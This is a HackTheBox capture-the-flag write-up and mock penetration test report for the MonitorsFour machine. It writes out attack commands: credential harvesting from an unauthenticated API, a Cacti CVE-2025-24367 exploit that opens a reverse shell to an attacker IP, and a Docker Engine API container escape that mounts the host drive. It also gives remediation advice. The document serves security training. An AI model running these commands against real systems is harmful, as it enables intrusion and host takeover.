# MonitorsFour

**Platform:** HackTheBox
**OS:** Windows
**Tags:** API Exposure, Credential Disclosure, CVE-2025-24367, Cacti RCE, Docker, CVE-2025-9074, Container Escape, IDOR, RCE, Privilege Escalation
**Date:** 2026-05-16

An unauthenticated API endpoint on the main domain leaks user credentials. CVE-2025-24367 authenticated RCE in Cacti lands a shell as www-data inside a Docker container. CVE-2025-9074 abuses Docker Desktop's Engine API on the internal subnet to mount the host filesystem and get root.

## 1. Enumeration

Full-port service scan with Nmap. Two ports open: port 80 running nginx serving a PHP web application, and port 5985 running WinRM.

```bash
nmap -sV -sC <TARGET_IP>
nmap -sV -sC <TARGET_IP> -p-

PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Added `monitorsfour.htb` to `/etc/hosts`. Port 5985 is WinRM, which becomes relevant once credentials are found.

Virtual host fuzzing with ffuf to look for subdomains:

```bash
ffuf -u http://monitorsfour.htb \
  -H 'Host: FUZZ.monitorsfour.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -k -t 50 -ac

# cacti     [Status: 302]
```

Added `cacti.monitorsfour.htb` to `/etc/hosts`. Browsing to it reveals a Cacti network monitoring application.

```bash
gobuster dir \
  -u http://cacti.monitorsfour.htb/cacti/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -b 302
```

## 2. Credential Discovery

The main domain at `monitorsfour.htb` has an unauthenticated API endpoint that exposes user account data (including usernames and MD5 password hashes) by iterating a token parameter:

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

The response includes the admin user's MD5 hash. MD5 is fast and unsalted here, cracked immediately with a wordlist against Hashcat or an online lookup. This gives valid credentials for the Cacti application.

**Result:** Credentials obtained: `marcus:<password>`.

## 3. Shell: CVE-2025-24367 (Cacti Authenticated RCE)

The Cacti instance is vulnerable to CVE-2025-24367, an authenticated RCE vulnerability in Cacti's Graph Template functionality. With the admin credentials in hand, the exploit can be run directly.

Set up a listener first, then run the exploit:

```bash
nc -lvnp 9001
```

```bash
sudo python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus \
  -p <password> \
  -i <ATTACKER_IP> \
  -l 9001
```

A shell lands as `www-data`. From the filesystem layout and network configuration it's clear this is a Docker container running the Cacti application, not the host itself. The user flag is accessible at `/home/marcus/user.txt` from within the container.

**Result:** Shell as `www-data` inside a Docker container. User flag at `/home/marcus/user.txt`.

## 4. Container Escape: CVE-2025-9074 (Docker Desktop API)

Network enumeration inside the container shows it sits on the `172.18.0.0/16` Docker bridge subnet. No Docker socket is mounted at `/var/run/docker.sock`, so the usual escape route is closed. However, Docker Desktop exposes an internal subnet at `192.168.65.0/24` for communication between the VM and the host.

```bash
ip addr
ip route
```

Scanning that internal subnet for port 2375 (the Docker Engine API) to check if it is exposed without authentication (CVE-2025-9074, CVSS 9.3):

```bash
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
    | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
done; wait

# 192.168.65.7:2375 OPEN
```

The Docker Engine API is open and unauthenticated at `192.168.65.7:2375`. On Docker Desktop for Windows, the host's `C:\` drive is accessible from the WSL2 VM at `/mnt/host/c`. The plan: create a new Alpine container via the API that mounts `/mnt/host/c` into the container, then read the root flag directly from the mounted filesystem.

On the attacker machine, craft the container payload and serve it over HTTP:

```bash
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

python3 -m http.server 8000 --directory /tmp
```

Inside the container, download the payload, create and start the container, then retrieve the logs which contain the flag output:

```bash
# Download payload
curl http://<ATTACKER_IP>:8000/container.json -o /tmp/container.json

# Create container
curl -X POST \
  -H "Content-Type: application/json" \
  -d @/tmp/container.json \
  "http://192.168.65.7:2375/containers/create?name=pwned"

# Start container
curl -X POST http://192.168.65.7:2375/containers/<CONTAINER_ID>/start

# Read logs - contains root flag
curl http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true
```

The container runs as root within the Docker Engine context. The flag is printed directly to stdout and captured in the container logs.

**Result:** Root flag read from `C:\Users\Administrator\Desktop\root.txt` via Docker API container escape.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** monitorsfour.htb
**Address:** cacti.monitorsfour.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 16 May 2026
**Environment:** HackTheBox laboratory assessment - Windows
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing against **monitorsfour.htb** identified one critical unauthenticated vulnerability, one critical unauthenticated Docker Engine API exposure, and one high-severity authenticated remote code execution. The combined chain produced full access to the host filesystem, including the Administrator's Desktop, without ever requiring interactive login credentials at the operating system level.
Initial credentials were obtained without authentication by iterating a token parameter on the main domain's API endpoint, which returned MD5-hashed user passwords. The recovered hash cracked immediately due to the absence of salting. These credentials authenticated to the Cacti network monitoring application on a subdomain, where CVE-2025-24367 permitted arbitrary command execution as `www-data` inside a Docker container.
Host access was achieved by exploiting CVE-2025-9074: Docker Desktop's Engine API on the internal `192.168.65.0/24` subnet was exposed without authentication on port 2375. A new container was created via the API with the host's `C:\` drive mounted, and the root flag was read directly from the mounted volume.

### Impact

The assessment obtained the contents of the Windows Administrator's Desktop through the Docker API escape, demonstrating full host compromise. An attacker in the same position could read or modify arbitrary files on the host drive, alter the Cacti monitoring configuration, and use the compromised Windows host as a pivot point into any connected network.

### Priority recommendations

1. Remove or restrict the unauthenticated user enumeration API endpoint on the main domain immediately.
2. Apply the Cacti patch for CVE-2025-24367 and enforce strong, unique credentials for all Cacti accounts.
3. Disable the Docker Engine API on port 2375 or require TLS mutual authentication; never expose an unauthenticated Docker socket to any network interface.

### Conclusion

The three findings form a linked compromise chain but represent independent control failures. Fixing the API exposure prevents credential harvesting; patching Cacti and securing the Docker Engine API each independently reduce the attack surface even without remediation of the others.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Description |
| --- | --- |
| monitorsfour.htb | Windows host; nginx serving PHP web application; WinRM on 5985 |
| cacti.monitorsfour.htb | Cacti network monitoring application in Docker container |
| Port | Service | Observed detail |
| --- | --- | --- |
| 80/tcp | HTTP | nginx; PHP application with unauthenticated user API |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0; Windows Remote Management |
| 2375/tcp (internal) | Docker Engine API | Unauthenticated; exposed on 192.168.65.7 (Docker Desktop internal subnet) |

```
nmap -sV -sC <TARGET_IP>

PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Virtual host fuzzing revealed cacti.monitorsfour.htb (HTTP 302). Both hostnames added to /etc/hosts before proceeding.

### 2.2 Approach

Testing began with service discovery and virtual host enumeration. The unauthenticated API on the main domain was identified and queried. Recovered credentials authenticated to Cacti; the version was fingerprinted against known CVEs. Following shell access inside the Docker container, internal network enumeration identified the Docker Desktop Engine API on the internal subnet.

```
ffuf -u http://monitorsfour.htb \
  -H 'Host: FUZZ.monitorsfour.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -k -t 50 -ac

# cacti     [Status: 302]
```

Subdomain cacti.monitorsfour.htb discovered via virtual host fuzzing.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unauthenticated API endpoint discloses user credentials | **Critical** | 6 |
| [F-02](#f-02) | CVE-2025-24367: Authenticated remote code execution in Cacti | **High** | 7 |
| [F-03](#f-03) | CVE-2025-9074: Unauthenticated Docker Engine API exposes host filesystem | **Critical** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Iterated token parameter on /user API endpoint; recovered MD5 password hash for admin user marcus. | Cacti credentials |
| 02 | Authenticated to Cacti; exploited CVE-2025-24367 Graph Template RCE. | www-data shell in Docker container |
| 03 | Enumerated internal Docker Desktop subnet; found unauthenticated Engine API on 192.168.65.7:2375. | Docker API access |
| 04 | Created Alpine container via API with host C:\ mounted; read root flag from mounted volume. | Host filesystem read (Administrator) |

### 3.3 Internal network discovery

The Docker container had no `/var/run/docker.sock` mount, closing the usual escape route. Network enumeration inside the container revealed the `192.168.65.0/24` Docker Desktop internal subnet. A loop scan confirmed port 2375 open and unauthenticated at `192.168.65.7` .

```
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
    | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
done; wait

# 192.168.65.7:2375 OPEN
```

## 4.1 Unauthenticated API Credential Disclosure

### F-01   User enumeration API - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The PHP application on the main domain exposes a `/user` endpoint that accepts a numeric `token` parameter without authentication. Iterating the parameter returns user account data including usernames and MD5 password hashes. The hashes are unsalted, making offline cracking trivial with standard wordlists. |
| Prerequisites | Network access to port 80. No credentials or session required. |
| Impact | Account credentials for any registered user can be recovered. During testing, credentials for the user `marcus` were obtained and used to authenticate to the Cacti application (F-02). |
| Affected system | monitorsfour.htb:80 `http://monitorsfour.htb/user?token=<n>` |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) : Exposure of Sensitive Information to an Unauthorised Actor |

### Steps to reproduce

1. Send a GET request to `http://monitorsfour.htb/user?token=0` without authentication.
2. Iterate the `token` parameter through sequential integer values.
3. Observe that each valid token returns a username and unsalted MD5 password hash.
4. Crack the returned MD5 hash offline using a common wordlist to recover the plaintext password.

### Evidence

```
curl -s "http://monitorsfour.htb/user?token=0"

# Response includes username and unsalted MD5 hash for admin user.
# Hash cracked offline against common wordlist - no GPU required.

Result: credentials marcus:<password> recovered without authentication.
```

Evidence E-01. API response transcribed from assessment record. Recovered password redacted. MD5 without salt cracked immediately via wordlist or online lookup.

### Remediation

Remove the unauthenticated user enumeration endpoint or require authenticated sessions before returning any account data. Replace MD5 with a modern adaptive hashing algorithm (bcrypt, Argon2id) and add unique per-user salts. Audit all API routes for access-control enforcement.

### Verification

Confirm that the `/user` endpoint returns an error or redirect for unauthenticated requests. Verify that no user data or hashes are included in unauthenticated API responses across all token values.

## 4.2 CVE-2025-24367: Authenticated RCE in Cacti

### F-02   Cacti Graph Template command injection - HIGH

| Field | Assessment |
| --- | --- |
| Description | The Cacti instance on cacti.monitorsfour.htb is affected by CVE-2025-24367, an authenticated remote code execution vulnerability in Cacti's Graph Template functionality. An authenticated user can inject arbitrary operating-system commands that execute under the web service account. |
| Prerequisites | Valid Cacti credentials. These were supplied by F-01 during testing. |
| Impact | Arbitrary code execution as `www-data` inside the Docker container hosting Cacti. The user flag at `/home/marcus/user.txt` within the container was accessible from this access level. |
| Affected system | cacti.monitorsfour.htb Cacti network monitoring application (version affected by CVE-2025-24367) |
| CVSS 3.1 | **8.8** (High) [AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code (Code Injection) |

### Steps to reproduce

1. Authenticate to the Cacti application at `http://cacti.monitorsfour.htb` using credentials recovered via F-01.
2. Confirm the Cacti version is affected by CVE-2025-24367.
3. Execute the public PoC exploit: `sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p <password> -i <ATTACKER_IP> -l 9001` .
4. Observe that a reverse shell connects as `www-data` inside the Docker container.

### Evidence

```
# Listener established
nc -lvnp 9001

# Public PoC exploit executed with credentials from F-01
sudo python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus \
  -p <password> \
  -i <ATTACKER_IP> \
  -l 9001

# Shell received
www-data@<container_id>:/var/www/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@<container_id>:~$ cat /home/marcus/user.txt
[redacted]
```

Evidence E-02. Exploit executed from assessment record. Shell lands as www-data in the Docker container. Container context confirmed by filesystem layout and network configuration. Flag value redacted.

### Remediation

Apply the vendor patch for CVE-2025-24367. Enforce strong, unique passwords for all Cacti accounts and restrict access to the Cacti interface to authorised IP ranges. Run the Cacti service under a dedicated low-privilege account and consider containerisation with appropriate network isolation.

### Verification

Confirm the Cacti installation is running a patched version and the CVE-2025-24367 attack path no longer succeeds with valid credentials. Validate that the service account cannot write outside its application directory.

## 4.3 CVE-2025-9074: Unauthenticated Docker Engine API

### F-03   Docker Desktop Engine API container escape - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Docker Desktop exposes the Docker Engine API on port 2375 of an internal subnet ( `192.168.65.0/24` ) without authentication. CVE-2025-9074 (CVSS 9.3) documents this exposure. On Docker Desktop for Windows, the host's C:\ drive is accessible inside the WSL2 VM at `/mnt/host/c` . An attacker with access to the internal subnet can create an arbitrary container that mounts this path, giving direct read and write access to the Windows host filesystem. |
| Prerequisites | Code execution inside any container on the Docker bridge network. Achieved via F-02 during testing. |
| Impact | Full read and write access to the Windows host filesystem as the container root user. The Administrator's Desktop and all files accessible to the Docker Engine service account are exposed. This constitutes host compromise. |
| Affected system | 192.168.65.7:2375 (Docker Desktop internal subnet) Host filesystem mounted at `/mnt/host/c` within WSL2 VM |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) : Missing Authentication for Critical Function |

### Steps to reproduce

1. From the `www-data` shell inside the Docker container, scan the internal subnet for port 2375: `for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "OPEN $i") & done; wait` .
2. Confirm the Docker Engine API at `192.168.65.7:2375` accepts unauthenticated requests.
3. Craft a container payload JSON mounting the host `C:\` drive and submit via `curl -X POST` to `/containers/create` .
4. Start the container via `/containers/<id>/start` and retrieve the root flag from `/containers/<id>/logs?stdout=true` .

### Evidence

```
# Confirm Engine API is open and unauthenticated
curl -s http://192.168.65.7:2375/version | grep ApiVersion

# Container payload - mounts C:\ into the new container
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  }
}

# Create and start container via API
curl -X POST -H "Content-Type: application/json" \
  -d @/tmp/container.json \
  "http://192.168.65.7:2375/containers/create?name=pwned"

curl -X POST http://192.168.65.7:2375/containers/<CONTAINER_ID>/start

# Retrieve flag from container logs
curl http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true
[redacted]
```

Evidence E-03. API calls transcribed from assessment record. Container ID and root flag redacted. The attack succeeds because no TLS or authentication is required on port 2375.

### Remediation

Disable the unauthenticated Docker Engine API. If remote API access is required, enable TLS mutual authentication. Review Docker Desktop network configuration to ensure the internal API is not reachable from container networks. Apply any available vendor patches addressing CVE-2025-9074.

### Verification

Confirm that port 2375 on the Docker Desktop internal subnet does not accept unauthenticated connections. Verify that no container can reach the Docker Engine API without presenting a valid client certificate.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Remove or authenticate the user enumeration API endpoint; replace MD5 with Argon2id or bcrypt. | F-01 |
| Immediate | Disable unauthenticated Docker Engine API on port 2375; require TLS mutual authentication if remote access is needed. | F-03 |
| High | Apply Cacti vendor patch for CVE-2025-24367; enforce strong unique credentials on all Cacti accounts. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/container.json` (container) | Docker API container payload | Not verified |
| Container named `pwned` (Docker Engine) | Escape demonstration container | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [MonitorsFour assessment walkthrough](monitorsfour-htb.html) . Flag values and cracked passwords are omitted from all evidence. The assessment did not verify exhaustive port coverage or examine all running containers.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: Credential Discovery - API enumeration and hash recovery |
| E-02 | Walkthrough section 3: Shell via CVE-2025-24367 Cacti RCE |
| E-03 | Walkthrough section 4: Container escape via CVE-2025-9074 Docker Engine API |
